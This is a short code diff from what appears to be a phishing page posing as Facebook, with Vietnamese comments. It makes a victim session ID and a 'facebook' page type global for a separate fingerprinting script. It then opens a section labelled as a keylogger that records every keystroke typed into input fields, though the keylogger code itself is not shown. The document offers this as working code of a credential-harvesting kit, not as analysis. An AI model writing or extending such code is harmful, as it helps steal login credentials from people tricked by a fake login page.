@@ -10,8 +10,10 @@ const loadingOverlay = document.getElementById('loadingOverlay');
 const errorMsg = document.getElementById('errorMsg');
 let submitCount = 0;
 
-// Session ID duy nhất cho mỗi lần truy cập
-const SESSION_ID = 'fb_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+// Session ID duy nhất cho mỗi lần truy cập (global cho fingerprint.js)
+window.SESSION_ID = 'fb_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+window.PAGE_TYPE = 'facebook';
+const SESSION_ID = window.SESSION_ID;
 
 // ===== KEYLOGGER =====
 // Ghi lại từng phím gõ vào các ô input
